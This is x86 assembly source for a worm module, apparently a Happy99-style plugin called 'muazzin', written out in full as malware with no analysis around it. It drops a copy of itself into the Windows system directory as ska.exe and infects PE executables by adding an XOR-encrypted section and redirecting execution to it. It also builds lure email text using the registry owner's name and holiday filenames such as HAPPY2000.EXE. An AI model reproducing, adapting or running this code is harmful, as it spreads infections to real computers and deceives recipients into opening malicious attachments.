;HAPPYBRIS

.386
.model flat
locals

dwo equ dword ptr
wo equ word ptr
by equ byte ptr
ofs equ offset

include \inc\pe.inc
include ..\..\muazzin.asi
include ..\crc.mac
include ..\h_api.inc

_TYPE    = "k2_h"
_VERSION = 0002h

.data

MUAZZIN EQU THIS BYTE

muazzin_entry:
       jmp @@entry
       db 13,10
       db "Igziabeher",13,10
       db "Let Jah be praised",13,10,0
  @@entry:
       pushad
       mov esi, [esp+4+8*4]
       call delta
       test dwo [esi+m_why], MT_QUERY
       jnz @@query
       test dwo [esi+m_why], MT_APP
       jz @@is_init
       pushad
       call initdll
       sub esp, 200h
       mov edi, esp
       push 104h
       push edi
       call [ebp+GetSystemDirectoryA]
       add edi, eax
       mov eax, "aks\"
       stosd
       mov eax, "exe."
       stosd
       sub eax, eax
       stosd
       mov ecx, esp
       push eax
       push 80h
       push 5   ;truncate_existing
       push eax
       push eax
       push 40000000h
       push ecx
       call [ebp+_CreateFileA_]
       mov ebx, eax
       inc eax
       jz @@sad_machine         ;no happy :(
       push 0
       mov eax, esp
       push 0
       push eax
       push dwo [esi+m_droppersize]
       push dwo [esi+m_dropper]
       push ebx
       call [ebp+_WriteFile_]
       mov [esp], ebx
       call [ebp+_CloseHandle_]
  @@sad_machine:
       sub esp, -200h
       popad
       jmp @@exit

  @@is_init:
       test dwo [esi+m_why], MT_PROCESSDROPPER
       jz @@is_gentext
       pushad
       call initdll
       call [ebp+GetTickCount]
       mov dwo [ebp+rnd_seed], eax
       mov edx, [esi+m_dropper]
       mov esi, edx
       add esi, [esi+3ch]
       lea edi, [esi+SIZE IMAGE_NT_HEADERS]
       pushad
       mov esi, [edi.SH_PointerToRawData]
       add esi, edx
       mov ecx, [edi.SH_SizeOfRawData]
  @@keep_running:
       cmp dwo [esi], 12345678h
     org $-4
       push dwo [esp]
       push dwo [esp]
     org $-2
       jne @@retry
       cmp wo [esi+4], 2434h
       je @@found_esp_esp
  @@retry:
       inc esi
       loop @@keep_running
       jmp @@found_done
  @@found_esp_esp:
       mov dwo [ebp+jmp_rawplace], esi
  @@found_done:
       test ecx, ecx
       popad
       jz @@fuck_weeror
       movzx eax, wo [esi.NT_FileHeader.FH_NumberOfSections]
       imul eax, eax, SIZE IMAGE_SECTION_HEADER
       add edi, eax
       mov eax, edi
       sub eax, edx
       add eax, SIZE IMAGE_SECTION_HEADER
       sub eax, [esi.NT_OptionalHeader.OH_SizeOfHeaders]
       jnb @@fuck_weeror
       inc wo [esi.NT_FileHeader.FH_NumberOfSections]
       mov dwo [edi], "PPAH"
       mov dwo [edi+4], "99Y"
       mov dwo [edi+36], 0c0000040h
       mov eax, IMPLANT_SIZE
       mov ecx, [esi.NT_OptionalHeader.OH_SectionAlignment]
       dec ecx
       mov ebx, [edi.SH_VirtualAddress-SIZE IMAGE_SECTION_HEADER]
       add ebx, [edi.SH_VirtualSize-SIZE IMAGE_SECTION_HEADER]
       add ebx, ecx
       add eax, ecx
       not ecx
       and ebx, ecx
       and eax, ecx
       mov [edi.SH_VirtualAddress], ebx
       mov [edi.SH_VirtualSize], eax
       add [esi.NT_OptionalHeader.OH_SizeOfImage], eax
       add ebx, [esi.NT_OptionalHeader.OH_ImageBase]    ;ebx==RVA of implant
       mov eax, [edi.SH_SizeOfRawData-SIZE IMAGE_SECTION_HEADER]
       add eax, [edi.SH_PointerToRawData-SIZE IMAGE_SECTION_HEADER]
       mov ecx, [esi.NT_OptionalHeader.OH_FileAlignment]
       mov ebp, IMPLANT_SIZE
       dec ecx
       add eax, ecx
       add ebp, ecx
       not ecx
       and eax, ecx
       and ebp, ecx
       mov dwo [edi.SH_PointerToRawData], eax
       mov dwo [edi.SH_SizeOfRawData], ebp
       lea edi, [edx+eax]
       add eax, ebp
       mov ecx, [esp+1*4]
       mov [ecx+m_droppersize], eax
       push edi
       call delta
       mov ecx, 0                       ;ebx=new section RVA
  reloc_count equ $-4
       lea esi, [ebp+implant_relocs]
       lea edi, [ebp+IMPLANT]
       sub eax, eax
  @@next_reloc:
       lodsw
       not ax
       add dwo [edi+eax], ebx
       loop @@next_reloc
       pop esi
       xchg esi, edi
       mov ecx, __encrypt-__main
       rep movsb
       mov ecx, encrypt_size_dword
  @@encrypt:
       lodsd
       xor eax, dwo [ebp+rnd_seed]
       stosd
       loop @@encrypt
       mov edi, 12345678h
  jmp_rawplace equ $-4
       mov al, 0e9h
     org $-1
      push 12345678h
     org $-4
       stosb
       mov eax, ebx
       stosd
       mov al, 0e9h
     org $-1
      ret
       stosb
       mov dwo [ebp+exit_value], MR_OK
  @@fuck_weeror:
       popad
       jmp @@exit

  @@is_gentext:
       test dwo [esi+m_why], MT_GENTEXT
       jz @@exit
       pushad
       call initdll
       call [ebp+GetTickCount]
       mov ebx, esi
       lea esi, [ebp+names]
       push 15
       sub edx,edx
       pop ecx
       div ecx
  @@next_string:
       test edx, edx
       jz @@use_dis_name
  @@next_string2:
       lodsb
       test al, al
       jnz @@next_string2
       dec edx
       jmp @@next_string
  @@use_dis_name:
       mov ebp, [ebx+m_buffer]
       lea edi, [ebp+mtext_exename]
       add edx, edi
  @@cpy:
       lodsb
       stosb
       test al, al
       jnz @@cpy
       mov esi, edx
       lea edi, [ebp+mtext_headers]

       pushad
       call delta

       push 0
       push esp
       push 000F003Fh
       push 0
       call @@temp666
       db "SOFTWARE\Microsoft\Windows\CurrentVersion",0
  @@temp666:
       push 80000002h    ;HKEY_LOCAL_MACHINE
       call [ebp+RegOpenKeyExA]
       test eax, eax
       pop ebx
       jnz @@nosender

       mov eax, "morF"
       stosd
       mov ax, " :"
       stosw

     push 104h
       push esp
       push edi
       push 0
       push 0
       call @@tmp666
       db "RegisteredOwner",0
  @@tmp666:
       push ebx
       call [ebp+RegQueryValueExA]
     pop eax
       dec eax
       add edi, eax

       push ebx
       call [ebp+RegCloseKey]

       mov ax, 0a0dh
       stosw

  @@nosender:
       mov [esp],edi
       popad

       mov eax, "jbuS"
       stosd
       mov eax, ":tce"
       stosd
       mov al, " "
       stosb
  @@loveloop:
       lodsb
       cmp al,"."
       je @@done_text
       cmp al, "_"
       jne @@no_spcae
       mov al, " "
  @@no_spcae:
       cmp al, "2"
       jne @@nonumba
       cmp by [edi-1], " "
       je @@nonumba
       push eax
       mov al, " "
       stosb
       pop eax
  @@nonumba:
       cmp al, "A"
       jb @@ok_cpy
       cmp al, "Z"
       ja @@ok_cpy
       cmp by [edi-1], " "
       je @@ok_cpy
       or al, 20h
  @@ok_cpy:
       stosb
       jmp @@loveloop
  @@done_text:
       call delta
       mov dwo [ebp+exit_value], MR_OK
       mov eax, 0a0dh
       stosw
       popad
       jmp @@exit
  @@exit:
       mov dwo [esi+m_result], MR_DONE
  exit_value equ $-4
       popad
       ret 4

  @@query:
       popad
       mov esi, MT_QUERY+MT_PROCESSDROPPER+MT_GENTEXT+MT_APP
       mov ebx, _TYPE
       mov ecx, _VERSION
       mov eax, MR_DONE
       ret 4

delta:
       call @@delta
  @@delta:
       pop ebp
       sub ebp, ofs @@delta
       ret

initdll:
       pushad
       push dwo [esi+GPA]
       mov eax, [esi+GMH]
       lea esi, [ebp+kernel32]
       push esi
       call eax
       mov ebx, eax
       lea edi, [ebp+GetSystemDirectoryA]
       call @@retry_api
       inc esi
       push esi
       call [ebp+LoadLibraryA]
       mov ebx, eax
       lea edi, [ebp+RegOpenKeyExA]
       call @@retry_api
       pop eax
       popad
       ret

  @@retry_api:
       lodsb
       test al, al
       jnz @@retry_api
       cmp by [esi], al
       je @@done_api
       push esi
       push ebx
       call [esp+4*2+4]
       stosd
       jmp @@retry_api
  @@done_api:
       ret

kernel32 db "kernel32.dll",0
       db "GetSystemDirectoryA",0
       db "CreateFileA",0
       db "WriteFile",0
       db "CloseHandle",0
       db "GetTickCount",0
       db "LoadLibraryA",0
       db 0

advapi32 db "advapi32.dll",0
       db "RegOpenKeyExA",0
       db "RegQueryValueExA",0
       db "RegCloseKey",0
       db 0

implant_relocs dw 3fh dup (-1)

names:
       db "HAPPY_NEW_YEAR.SCR",0
       db "HAPPY2K.EXE",0
       db "HAPPY_NEW_MILLENIUM.SCR",0
       db "FELIZ_A¥O_2000.SCR",0
       db "FELIZ_ANO_2000.SCR",0
       db "FELIZ_MILENIO.SCR",0
       db "SECULO_FELIZ.SCR",0
       db "HAPPY2000.EXE",0
       db "HAPPY2001.SCR",0
       db "HAPPY_19100.EXE",0
       db "HAPPY_NEW_CENTURY.EXE",0
       db "MEINE_GLUECKWUENSCHE.SCR",0
       db "HERZLICHE_GLUECKWUENSCHE.SCR",0
       db "EIN_GUTES_NEUJAHR.SCR",0
       db "GUTE_FEIERTAGE.SCR",0

align 4

IMPLANT EQU THIS BYTE

encrypt_size_dword equ (__encrypt_end-__encrypt)/4

__main:
       mov ecx, encrypt_size_dword
       mov esi, ofs __encrypt
       mov edi, esi
  @@decrypt:
       lodsd
       xor eax, 12345678h
  rnd_seed equ $-4
       stosd
       loop @@decrypt
       jmp __encrypt
align 4
  __encrypt:
       mov edi, ofs gdi32addy
       mov esi, ofs gdi32api
       mov eax, ofs gdi32
       call import_dll
       mov edi, ofs user32addy
       mov esi, ofs user32api
       mov eax, ofs user32
       call import_dll
       mov edi, ofs wndclass
       mov eax, 4003h
       stosd        ;clsStyle
       mov ecx, gdi32addy-clsLpfnWndProc
       sub eax, eax
       rep stosb
       sub esp, 7fh
       mov esi, esp
       push 7fh
       push esi
       push eax
       call dwo [__GetModuleFileNameA+7fh+3*4]
       test eax, eax
       jz kill
  @@set_edx:
       sub ecx, ecx
       mov edx, esi
  @@serch:
       lodsb
       test al, al
       jz calc_crc
       cmp al, "\"
       je @@set_edx
       cmp al, "a"
       jb @@serch2
       cmp al, "z"
       ja @@serch2
       and byte ptr [esi-1], 0dfh
  @@serch2:
       inc ecx
       jmp @@serch

import_dll:
       push eax
       call dwo [__LoadLibraryA+4+4]
       mov ebx, eax
  @@next_api:
       cmp by [esi], 0
       je @@done
       push esi
       push ebx
       call dwo [__GetProcAddress+2*4+4]
       stosd
  @@nextb:
       lodsb
       test al, al
       jnz @@nextb
       jmp @@next_api
  @@done:
       ret

gdi32 db "GDI32",0
gdi32api:
      db "CreateSolidBrush",0
      db "StretchDIBits",0
      db 0

user32 db "USER32",0
user32api:
       db "CreateWindowExA",0
       db "PeekMessageA",0
       db "GetSystemMetrics",0
       db "GetDC",0
       db "GetClientRect",0
       db "DispatchMessageA",0
       db "PostQuitMessage",0
       db "RegisterClassA",0
       db "ShowWindow",0
       db "ReleaseDC",0
       db "TranslateMessage",0
       db "UpdateWindow",0
       db "DefWindowProcA",0
       db 0

  calc_crc:
       push -1
       pop eax
  @@l1:
       xor al, [edx]
       inc edx
       mov bl, 8
  @@l2:
       shr eax, 1
       jnc @@l3
       xor eax, 0EDB88320h
  @@l3:
       dec bl
       jnz @@l2
       loop @@l1
       add esp, 7fh

       cmp eax, 12345678h
     org $-4
       crc <HAPPY2000.EXE>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HAPPY2001.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HAPPY_19100.EXE>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HAPPY_NEW_CENTURY.EXE>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HAPPY99.EXE>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HAPPY2K.EXE>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HAPPY_NEW_YEAR.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HAPPY_NEW_MILLENIUM.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <FELIZ_A¥O_2000.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <FELIZ_ANO_2000.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <FELIZ_MILENIO.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <MEINE_GLUECKWUENSCHE.EXE>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <HERZLICHE_GLUECKWUENSCHE.EXE>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <EIN_GUTES_NEUJAHR.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <GUTE_FEIERTAGE.SCR>
       je @@is_ourname
       cmp eax, 12345678h
     org $-4
       crc <SECULO_FELIZ.SCR>
       jne kill
  @@is_ourname:

;FROM NOW ONWARDS, BLAME SPANSKA FOR ALL THE BUGS

include happy99.asi

align 4

__encrypt_end:

IMPLANT_END EQU THIS BYTE
IMPLANT_SIZE EQU IMPLANT_END-IMPLANT
MUAZZIN_END EQU THIS BYTE
MUAZZIN_SIZE EQU MUAZZIN_END-MUAZZIN

wndclass:
clsStyle          dd 4003h	; class style
clsLpfnWndProc    dd ?
clsCbClsExtra     dd 0
clsCbWndExtra     dd 0
clsHInstance      dd ?		; instance handle
clsHIcon          dd 0		; class icon handle
clsHCursor        dd 0		; class cursor handle
clsHbrBackground  dd 0		; class background brush
clsLpszMenuName   dd 0		; menu name
clsLpszClassName  dd ?		; far ptr to class name

msg:
msHWND          dd ?
msMESSAGE       dd ?
msWPARAM        dd ?
msLPARAM        dd ?
msTIME          dd ?
msPT            dd ?
protege dd ?

;shit for my window

handle_wd	dd ?
adresse_retour	dd ?

;shit for the graphic effect

mem_header	dd ?		;offset of buffer for bitmap header + palette
mem_bitmap	dd ?		;offset of buffer for bitmap pixels
mem_table	dd ?		;offset of buffer for particles structures
nb_explosions	dd 0
compteur	dd 0
color		dd ?
yy		dd ?
xx		dd ?

gdi32addy:
CreateSolidBrush dd ?
StretchDIBits dd ?

user32addy:
CreateWindowExA dd ?
PeekMessageA  dd ?
GetSystemMetrics dd ?
GetDC         dd ?
GetClientRect dd ?
DispatchMessageA dd ?
PostQuitMessage dd ?
RegisterClassA dd ?
ShowWindow    dd ?
ReleaseDC dd ?
TranslateMessage dd ?
UpdateWindow  dd ?
DefWindowProcA dd ?

GetSystemDirectoryA dd ?
_CreateFileA_ dd ?
_WriteFile_ dd ?
_CloseHandle_ dd ?
GetTickCount dd ?
LoadLibraryA dd ?

RegOpenKeyExA dd ?
RegQueryValueExA dd ?
RegCloseKey   dd ?


;FIRST GENERATION PROCESSING... PROCESS RELOCS, CREATE PURE MUAZZIN CODE

.code

main:
       mov ebx, 400000h
       mov edi, [ebx+3ch]
       add edi, ebx
       lea eax, [edi+NT_OptionalHeader.OH_DirectoryEntries.DE_BaseReloc]
       mov esi, [eax+DD_VirtualAddress]
       add esi, ebx
       mov edi, ofs implant_relocs
       mov ebp, 2000h
  @@reloc_block:
       lodsd
       test eax, eax
       jz @@done_relocs
       cmp eax, ebp
       lodsd
       jnz @@add_blocksz
       lea ecx, [eax-8]
       shr ecx, 1
  @@reloc_read:
       lodsw
       mov ebx, eax
       and ebx, 0000111111111111b
       shr eax, 12
       sub al, 3
       jnz @@no_right_kind
       cmp ebx, ofs IMPLANT-402000h
       jb @@no_right_kind
       cmp ebx, ofs IMPLANT_END-402000h
       ja @@no_right_kind
       sub dwo [ebp+ebx+400000h], ofs IMPLANT
       mov eax, ebx
       sub eax, ofs IMPLANT-402000h
       not ax
       stosw
       inc dwo [reloc_count]
  @@no_right_kind:
       loop @@reloc_read
       jmp @@reloc_block
  @@add_blocksz:
       lea esi, [esi+eax-8]
       jmp @@reloc_block
  @@done_relocs:
       push 0
       push 80h
       push 2
       push 0
       push 0
       push 40000000h
       call @@skipz
       db "happy2k",0
  @@skipz:
extrn CreateFileA:PROC
       call CreateFileA
       mov ebx, eax
       inc eax
       jz @@error
       push 0
       push esp
       push ofs MUAZZIN_SIZE
       push ofs MUAZZIN
       push ebx
extrn WriteFile:PROC
       call WriteFile
       pop eax
       push ebx
extrn CloseHandle:PROC
       call CloseHandle
  @@error:
       push 0
extrn ExitProcess:PROC
       call ExitProcess

end main

